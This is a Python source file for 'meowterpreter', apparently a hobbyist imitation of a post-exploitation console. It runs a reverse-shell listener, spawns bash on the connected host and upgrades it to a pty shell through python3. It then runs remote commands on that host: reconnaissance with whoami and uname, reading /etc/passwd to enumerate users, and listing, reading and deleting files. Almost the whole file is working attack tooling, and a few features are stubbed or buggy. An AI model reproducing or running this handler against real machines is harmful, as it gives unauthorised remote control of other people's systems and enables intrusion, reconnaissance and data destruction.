from datetime import datetime
import os, re
import cmd, sys, tty
import socket, termios
import time, select, signal
import threading, subprocess


CHUNK_SIZE = 320000
ECHOENDLINE = 'terminal_return_success:'
session_array = [None]

def sigint_handler(signum, frame):
    raise UserInputBreakout('User breakout of loop')

def sigtstp_handler(signum, frame):
    raise UserInputBackground('User breakout of loop')

def socket_handler(signum, frame):
    raise UserSocketBreakout('User breakout socket loop')

class Error(Exception):
    """Base class for other exceptions"""
    pass

class UserInputBreakout(Error):
    pass

class UserInputBackground(Error):
    pass

class UserSocketBreakout(Error):
    pass

class NoShell(Error):
    pass


class Socket: # TODO: make a listen function and a connect
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.data = b''
        self.conn, self.addr = [None, None]
        self.is_alive = True
        self.out_err = False
        self.index = None
        self.output_data = False

    def listen(self, host, port):
        server = self.server
        server.bind((host, port))

        server.listen()

        print(f'[*] Started reverse TCP handler on {host}:{port}')

        self.conn, self.addr = server.accept()

        print('[*] Connection established...')

    def sendmsg(self, cmd, timeout_int):
        self.conn.sendall(cmd.encode('utf-8'))
        self.data = b''
        data_chunk = b''
        timeout = time.time() + timeout_int
        while True:
            if self.data:
                if self.data not in data_chunk:
                    data_chunk = data_chunk + self.data
                if ECHOENDLINE.encode('utf-8') in data_chunk:
                    return data_chunk.decode('utf-8')
            if time.time() > timeout:
                return None

    def recvmsg(self):
        while self.is_alive:
            try:
                r, _, _ = select.select([self.conn], [], [], 0.5)
                if r:
                    try:
                        self.data = self.conn.recv(CHUNK_SIZE)
                        if self.output_data: print(self.data.decode('utf-8'), end='', flush=True, sep='\r') # For raw_shell
                    except(OSError):
                        break
                if not self.data: raise BrokenPipeError('error: Client unexpectedly closed')
            except(ValueError):
                break
            except(BrokenPipeError):
                self.is_alive = False
                if self.output_error: print(f'\n[*] Session {self.index} closed. reason: Broken Pipe')
                self.close()
                break

    def close(self):
        self.is_alive = False
        self.server.close()
        self.conn.close()
        session_array[self.index] = None


class Shell(cmd.Cmd):
    prompt = 'meowterpreter > '

    def __init__(self, socket, index):
        cmd.Cmd.__init__(self)
        self.socket = socket
        self.socket.index = index
        self.shell_running = False
        self.socket.conn.send(b'/bin/bash 2>&1\n')

        threading.Thread(target=self.socket.recvmsg).start()

        self._sendmsg('echo test')
        if not self.socket.is_alive:
            raise NoShell()

        self.socket.output_error = True

        signal.signal(signal.SIGINT, sigint_handler)
        signal.signal(signal.SIGTSTP, sigtstp_handler)
        
        # Variables
        self.bin_cat        = self._sendmsg('which cat')
        self.bin_php        = self._sendmsg('which php2')
        self.bin_python     = self._sendmsg('which python')
        self.bin_python3    = self._sendmsg('which python3')
        self.arch           = None
        self.username       = self._sendmsg('whoami').strip()
        self.platform       = self._sendmsg('uname -s').strip()
        self.ip             = self.socket.addr


    def precmd(self, line):
        """Hook method executed just before the command line is
        interpreted, but after the input prompt is generated and issued.
        """
        if not self.socket.is_alive:
            self._exit()
            raise BrokenPipeError()

        return line

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished."""
        
        if not self.socket.is_alive:
            self._exit()
            stop = True

        return stop

    def emptyline(self):
        return False

    def _sendmsg(self, args, timeout_int=5):
        try:
            msg = self.socket.sendmsg(f'{args}; echo {ECHOENDLINE}$?\n', timeout_int).split(f'{ECHOENDLINE}')
            msg[1] = msg[1].strip()

        except(BrokenPipeError):
            self.socket.is_alive = False
            print(f'[*] Closed connection, reason: Broken Pipe')
            return None
        except(AttributeError):
            return None
        
        if msg[0] != '':
            return msg[0]
        else:
            return None

    def do_id(self, args):
        print(self._sendmsg('id'))

    # I got pissed lmao
    def do_put(self, args):
        '''Uploads files to the remote machine'''
        return False

    def do_get(self, args):
        '''Downloads files to the remote machine'''
        return False

    def do_test(self, args):
        if not args:
            print('test: NUMBER')
            return
        for _ in range(int(args)):
            self._sendmsg('ls -lA /etc')

    def do_shell(self, args):
        '''Spawns a pty shell if python is installed'''

        '''
        Weird bug that vim will launch stuff out of order when using this method.
        Looks broken and idk what will solve it.

        When using the vscode terminal it launches with no problems what so ever
        '''
        def getch():
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch
    
        print('[*] Shell started. To exit press ctrl+D\n')
        if self.bin_python3:
            self.socket.conn.sendall(b'python3 -c "import pty;pty.spawn(\'/bin/bash\')"\n')
        self.socket.output_data = True

        while True:
            uinput = getch()
            encoded = uinput.encode('utf-8')
            if encoded == b'\x04':
                self.socket.output_data = False
                shell_level = self._sendmsg('hello')
                if shell_level == 'hello; echo ': self.socket.conn.sendall(b'exit\n')
                print('')
                break

            self.socket.conn.sendall(encoded)

    def do_ls(self, args): # BUG selecting a file instead of a directory will list current directory folder only
        if not args:
            pwd = self._sendmsg(f'pwd').strip()
            msg = self._sendmsg(f'ls -lA')
        else:
            old_pwd = self._sendmsg('pwd').strip()
            self._sendmsg(f'cd {args}')
            pwd = self._sendmsg('pwd').strip()
            msg = self._sendmsg(f'ls -lA')
            self._sendmsg(f'cd {old_pwd}')

        if not 'no such file or directory: ' in pwd.lower():
            print(f'Listing: {pwd}')
            print((len(pwd) + 9) * '=' + '\n')
            print(msg)
        else:
            print(msg)

    def do_cd(self, args):
        if args:
            print('Usage: cd FOLDER')
            return

        msg = self._sendmsg(f'cd {args}')
        if msg != None: print(msg, end='')

    def do_rm(self, args):
        if not args:
            print('Usage: rm FILE')
            return

        if args != '/':
            msg = self._sendmsg(f'rm {args}')
            if msg != None: print(msg, end='')
        else:
            print('[!] Error: Wait dont do that\n')

    def do_cat(self, args):
        if not args:
            print('Usage: cat FILE')
            return

        msg = self._sendmsg(f'echo "$(<{args})"')
        if msg: print(msg)
    
    def do_touch(self, args):
        if not args:
            print('Usage: cat FILE')
            return
        self._sendmsg(f'touch {args}')

    def do_users(self, args):
        msg = self._sendmsg(f'echo "$(</etc/passwd)" | grep -v nologin | grep -v false | grep -v sync')
        for user_string in list(filter(None, msg.split('\n'))):
            user_dets = user_string.split(':')
            print(f'({user_dets[0]+")":<15} {user_dets[5]:<20} {user_dets[6]:<20}')
        print('')

    def _exit(self):
        self.socket.close()
        signal.signal(signal.SIGINT, socket_handler)

    def do_exit(self, args):
        self._exit()
        print(f'[*] Session {self.socket.index} closed. reason: User Exit\n')
        signal.signal(signal.SIGINT, socket_handler)


class Console(cmd.Cmd):
    prompt = '(local) console > '

    def __init__(self):
        cmd.Cmd.__init__(self)
        signal.signal(signal.SIGINT, socket_handler)

        # Console variables TODO make func to change these
        self.host = '0.0.0.0'
        self.port = 9001

    def default(self, line):
        try:
            ps = subprocess.Popen(line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            print(ps.communicate()[0].decode('utf-8'))
        except(FileNotFoundError):
            print(f'[!] Unknown command {line}')

    def emptyline(self):
        return

    def start_meow(self, meow_shell):
        try:
            meow_shell.cmdloop()
        except(UserInputBreakout):
            if not meow_shell.socket.is_alive:
                meow_shell._exit()
                return
            print('Interrupt: use the \'exit\' command to quit')
            self.start_meow(meow_shell)
        except(UserInputBackground):
            if input('\nBackground session? [y/n] ').lower().startswith('y'):
                signal.signal(signal.SIGINT, socket_handler)
                return
            else:
                self.start_meow(meow_shell)
        except(BrokenPipeError):
            return

    def do_set(self, args):
        if not args: return
        arr = args.split(' ')
        var = arr[0].lower()
        value = arr[1].lower()
        if var == 'host':
            print(f'HOST = {value}\n')
            self.host = value
        elif var == 'port':
            print(f'PORT = {value}\n')
            self.port = int(value)
    
    def do_options(self, args):
        print(self.host)
        print(self.port)

    def do_sessions(self, args): # make this propper
        '''list active sessions and jumps to sessions in background'''
        if not args:
            for mshell in session_array:
                if mshell != None:
                    print(f'Session {mshell.socket.index} | OS: {mshell.platform} | Username: {mshell.username} | {mshell.ip[0]}:{mshell.ip[1]}')
            print('')
            return

        try:
            index = int(args)
            meow_shell = session_array[index]
            self.start_meow(meow_shell)
        except(IndexError, AttributeError):
            print('[!] Session does not exists\n')
        except(ValueError):
            pass

    def do_connect(self, args):
        '''Connects to a remote shell'''

    def do_listen(self, args):
        '''Starts a reverse shell listener'''
        socket_session = Socket()

        try:
            socket_session.listen(self.host, self.port)
        except(OSError):
            print('[!] Error: Port is already in use\n')
            return
        except(ValueError, TypeError, OverflowError):
            print('[!] Error: Invalid port\n')
            return
        except(PermissionError):
            print('[!] Access denied: Cant use port\n')
            return
        except(UserSocketBreakout):
            print('')
            return

        session_index = len(session_array)
        try:
            meow_shell = Shell(socket_session, session_index)
        except(NoShell):
            print('[!] Error: Shell not found\n')
            return
        
        session_array.append(meow_shell)

        date_obj = datetime.now()
        print(f'[*] Command shell session {session_index} opened ({self.host}:{self.port} -> {socket_session.addr[0]}:{socket_session.addr[1]}) at {date_obj}\n')

        self.start_meow(meow_shell)

    def do_exit(self, arg):
        '''Closes program.'''
        if session_array:
            for session in session_array:
                if session != None:
                    session.socket.is_alive = False
                    session.socket.conn.close()
        sys.exit()

def main(shell):
    try:
        shell.cmdloop()
    except(UserSocketBreakout):
        print('Interrupt: use the \'exit\' command to quit')
        main(shell)


if __name__ == '__main__':
    shell = Console()
    main(shell)
